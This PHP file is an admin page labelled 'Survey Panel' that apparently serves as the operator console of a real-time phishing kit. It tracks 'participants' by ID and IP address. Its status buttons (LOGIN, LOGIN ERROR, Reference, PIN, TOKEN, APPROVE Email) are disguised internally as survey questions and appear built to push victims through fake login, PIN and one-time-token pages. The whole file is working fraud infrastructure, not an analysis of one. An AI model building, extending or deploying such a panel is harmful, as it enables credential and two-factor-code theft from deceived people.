<?php
session_start();

// Check if admin is logged in
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    header('Location: login.php');
    exit();
}

// Session timeout (2 hours)
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > 7200)) {
    session_unset();
    session_destroy();
    header('Location: login.php?timeout=1');
    exit();
}
$_SESSION['last_activity'] = time();

// Get participant ID from URL
$participant_id = $_GET['participant'] ?? '';
if (empty($participant_id)) {
    header('Location: dashboard.php?error=no_participant');
    exit();
}

// Function to load participants
function loadParticipants() {
    $participants_file = '../session/participants.json';
    if (!file_exists($participants_file)) {
        return [];
    }
    return json_decode(file_get_contents($participants_file), true) ?: [];
}

// Function to update score in scores.json
function updateScore($participant_id, $status, $participant_data, $additional_data = null) {
    $scores_file = '../session/scores.json';
    
    // Create file if it doesn't exist
    if (!file_exists($scores_file)) {
        file_put_contents($scores_file, json_encode([]));
    }
    
    // Read existing scores
    $scores = json_decode(file_get_contents($scores_file), true) ?: [];
    
    // Update score entry
    $scores[$participant_id] = [
        'id' => $participant_data['id'],
        'status' => $status,
        'ip' => $participant_data['ip'],
        'updated_at' => date('Y-m-d H:i:s')
    ];
    
    // Add additional data if provided
    if ($additional_data !== null && !empty($additional_data)) {
        $scores[$participant_id]['additional_info'] = $additional_data;
    }
    
    // Save back to file
    file_put_contents($scores_file, json_encode($scores, JSON_PRETTY_PRINT));
}

$message = '';
$message_type = '';

// Handle button actions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    $participants = loadParticipants();
    
    if (isset($participants[$participant_id])) {
        $participant = $participants[$participant_id];
        
        switch ($action) {
            case 'question1':
                updateScore($participant_id, 'question1', $participant);
                $message = 'Status updated to Question 1';
                $message_type = 'success';
                break;
                
            case 'question1_error':
                updateScore($participant_id, 'question1 error', $participant);
                $message = 'Status updated to Question 1 Error';
                $message_type = 'success';
                break;
                
            case 'question2':
                updateScore($participant_id, 'question2', $participant);
                $message = 'Status updated to Question 2';
                $message_type = 'success';
                break;
                
            case 'pin':
                updateScore($participant_id, 'pin', $participant);
                $message = 'Status updated to pin';
                $message_type = 'success';
                break;
                
            case 'question3':
                $question3_data = $_POST['question3_data'] ?? '';
                updateScore($participant_id, 'question3', $participant, $question3_data);
                $message = 'Status updated to Question 3' . (!empty($question3_data) ? ' with additional info' : '');
                $message_type = 'success';
                break;
                
            case 'approve_email':
                updateScore($participant_id, 'approve_email', $participant);
                $message = 'Status updated to approve email';
                $message_type = 'success';
                break;
                
            case 'loading':
                updateScore($participant_id, 'loading', $participant);
                $message = 'Status updated to Loading';
                $message_type = 'success';
                break;
                
            case 'completed':
                updateScore($participant_id, 'completed', $participant);
                $message = 'Status updated to Completed';
                $message_type = 'success';
                break;
                
            case 'blocked':
                updateScore($participant_id, 'blocked', $participant);
                $message = 'Participant has been Blocked';
                $message_type = 'success';
                break;
                
            default:
                $message = 'Invalid action';
                $message_type = 'error';
        }
    } else {
        $message = 'Participant not found';
        $message_type = 'error';
    }
}

// Load current participant data
$participants = loadParticipants();

if (!isset($participants[$participant_id])) {
    header('Location: dashboard.php?error=participant_not_found');
    exit();
}

$participant = $participants[$participant_id];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Manage Participant - Survey Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f7fa;
            line-height: 1.6;
        }

        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 1rem 2rem;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }

        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 1200px;
            margin: 0 auto;
        }

        .logo h1 {
            font-size: 1.5rem;
        }

        .back-btn {
            background: rgba(255,255,255,0.2);
            color: white;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            transition: background 0.3s ease;
        }

        .back-btn:hover {
            background: rgba(255,255,255,0.3);
        }

        .container {
            max-width: 800px;
            margin: 2rem auto;
            padding: 0 2rem;
        }

        .participant-card {
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 2rem;
            margin-bottom: 2rem;
        }

        .participant-header {
            display: flex;
            align-items: center;
            gap: 1rem;
            margin-bottom: 2rem;
            padding-bottom: 1rem;
            border-bottom: 1px solid #e9ecef;
        }

        .participant-avatar {
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
            color: white;
        }

        .participant-info h2 {
            color: #333;
            margin-bottom: 0.5rem;
        }

        .participant-info p {
            color: #666;
            font-size: 0.9rem;
        }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1.5rem;
            margin-bottom: 2rem;
        }

        .info-item {
            background: #f8f9fa;
            padding: 1rem;
            border-radius: 8px;
        }

        .info-label {
            font-weight: 600;
            color: #333;
            margin-bottom: 0.5rem;
        }

        .info-value {
            color: #666;
        }

        .status-badge {
            padding: 0.25rem 0.75rem;
            border-radius: 15px;
            font-size: 0.8rem;
            font-weight: 500;
        }

        .status-question1, .status-question2, .status-question3 {
            background: #e3f2fd;
            color: #1976d2;
        }

        .status-loading {
            background: #fff3e0;
            color: #f57c00;
        }

        .status-completed {
            background: #e8f5e8;
            color: #388e3c;
        }

        .status-blocked {
            background: #ffebee;
            color: #d32f2f;
        }

        .actions-section {
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 2rem;
        }

        .section-title {
            font-size: 1.25rem;
            color: #333;
            margin-bottom: 1.5rem;
        }

        .buttons-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin-bottom: 2rem;
        }

        .action-btn {
            padding: 1rem;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.3s ease;
            color: white;
            font-weight: 500;
        }

        .btn-question {
            background: linear-gradient(135deg, #007bff 0%, #0056b3 100%);
        }

        .btn-question:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(0,123,255,0.3);
        }

        .btn-error {
            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
        }

        .btn-error:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(220,53,69,0.3);
        }

        .btn-loading {
            background: linear-gradient(135deg, #ffc107 0%, #e0a800 100%);
            color: #212529;
        }

        .btn-loading:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(255,193,7,0.3);
        }

        .btn-completed {
            background: linear-gradient(135deg, #28a745 0%, #218838 100%);
        }

        .btn-completed:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(40,167,69,0.3);
        }

        .btn-blocked {
            background: linear-gradient(135deg, #6c757d 0%, #545b62 100%);
        }

        .btn-blocked:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(108,117,125,0.3);
        }

        .message {
            padding: 1rem;
            border-radius: 8px;
            margin-bottom: 2rem;
            font-weight: 500;
            animation: slideIn 0.3s ease-out;
        }

        .message.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .message.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @media (max-width: 768px) {
            .container {
                padding: 0 1rem;
            }

            .participant-header {
                flex-direction: column;
                text-align: center;
            }

            .buttons-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
    <script>
        function toggleQuestion3Form() {
            const form = document.getElementById('question3-form');
            if (form.style.display === 'none' || form.style.display === '') {
                form.style.display = 'block';
            } else {
                form.style.display = 'none';
            }
        }
    </script>
</head>
<body>
    <header class="header">
        <div class="header-content">
            <div class="logo">
                <h1>🛡️ Participant Management</h1>
            </div>
            <a href="dashboard.php" class="back-btn">← Back to Dashboard</a>
        </div>
    </header>

    <div class="container">
        <?php if ($message): ?>
        <div class="message <?php echo $message_type; ?>">
            <?php if ($message_type === 'success'): ?>✅<?php else: ?>❌<?php endif; ?> <?php echo htmlspecialchars($message); ?>
        </div>
        <?php endif; ?>

        <!-- Participant Info -->
        <div class="participant-card">
            <div class="participant-header">
                <div class="participant-avatar">👤</div>
                <div class="participant-info">
                    <h2>Participant Details</h2>
                    <p>Manage this participant's status and scoring</p>
                </div>
            </div>

            <div class="info-grid">
                <div class="info-item">
                    <div class="info-label">Participant ID</div>
                    <div class="info-value"><?php echo htmlspecialchars($participant['id']); ?></div>
                </div>
                <div class="info-item">
                    <div class="info-label">Current Status</div>
                    <div class="info-value">
                        <span class="status-badge status-<?php echo str_replace(['_', ' '], '-', strtolower($participant['status'])); ?>">
                            <?php echo htmlspecialchars(ucfirst(str_replace('_', ' ', $participant['status']))); ?>
                        </span>
                    </div>
                </div>
                <div class="info-item">
                    <div class="info-label">IP Address</div>
                    <div class="info-value"><?php echo htmlspecialchars($participant['ip']); ?></div>
                </div>
            </div>
        </div>

        <!-- Actions -->
        <div class="actions-section">
            <h3 class="section-title">📋 Update Participant Status</h3>
            
            <div class="buttons-grid">
                <form method="POST" action="" style="display: contents;">
                    <input type="hidden" name="action" value="question1">
                    <button type="submit" class="action-btn btn-question">
                        LOGIN
                    </button>
                </form>
                
                <form method="POST" action="" style="display: contents;">
                    <input type="hidden" name="action" value="question1_error">
                    <button type="submit" class="action-btn btn-error">
                        ❌ LOGIN ERROR
                    </button>
                </form>
                
                <form method="POST" action="" style="display: contents;">
                    <input type="hidden" name="action" value="question2">
                    <button type="submit" class="action-btn btn-question">
                        1 - Reference
                    </button>
                </form>
                
                <form method="POST" action="" style="display: contents;">
                    <input type="hidden" name="action" value="pin">
                    <button type="submit" class="action-btn btn-question">
                        2 - PIN
                    </button>
                </form>
                
                <button type="button" class="action-btn btn-question" onclick="toggleQuestion3Form()">
                    3 - TOKEN
                </button>
                
                <div id="question3-form" style="display: none; margin-top: 1rem; padding: 1rem; background: #f8f9fa; border-radius: 8px;position: absolute;">
                    <form method="POST" action="">
                        <input type="hidden" name="action" value="question3">
                        <div style="margin-bottom: 1rem;">
                            <label for="question3-input" style="display: block; font-weight: 600; margin-bottom: 0.5rem;">Additional Info:</label>
                            <input type="text" id="question3-input" name="question3_data" placeholder="Enter any additional information..." style="width: 100%; padding: 0.5rem; border: 1px solid #ccc; border-radius: 4px;">
                        </div>
                        <div style="display: flex; gap: 0.5rem;">
                            <button type="submit" class="action-btn btn-question" style="flex: 1;">
                                ✅ Submit
                            </button>
                            <button type="button" class="action-btn btn-error" onclick="toggleQuestion3Form()" style="flex: 1;">
                                ❌ Cancel
                            </button>
                        </div>
                    </form>
                </div>
                
                <form method="POST" action="" style="display: contents;">
                    <input type="hidden" name="action" value="approve_email">
                    <button type="submit" class="action-btn btn-question">
                        4 - APPROVE Email
                    </button>
                </form>
                
                <form method="POST" action="" style="display: contents;">
                    <input type="hidden" name="action" value="loading">
                    <button type="submit" class="action-btn btn-loading">
                        ⏳ Loading
                    </button>
                </form>
                
                <form method="POST" action="" style="display: contents;">
                    <input type="hidden" name="action" value="completed">
                    <button type="submit" class="action-btn btn-completed">
                        ✅ Completed
                    </button>
                </form>
                
                <form method="POST" action="" style="display: contents;" onsubmit="return confirm('Are you sure you want to block this participant?')">
                    <input type="hidden" name="action" value="blocked">
                    <button type="submit" class="action-btn btn-blocked">
                        🚫 Blocked
                    </button>
                </form>
            </div>
        </div>
    </div>
</body>
</html>
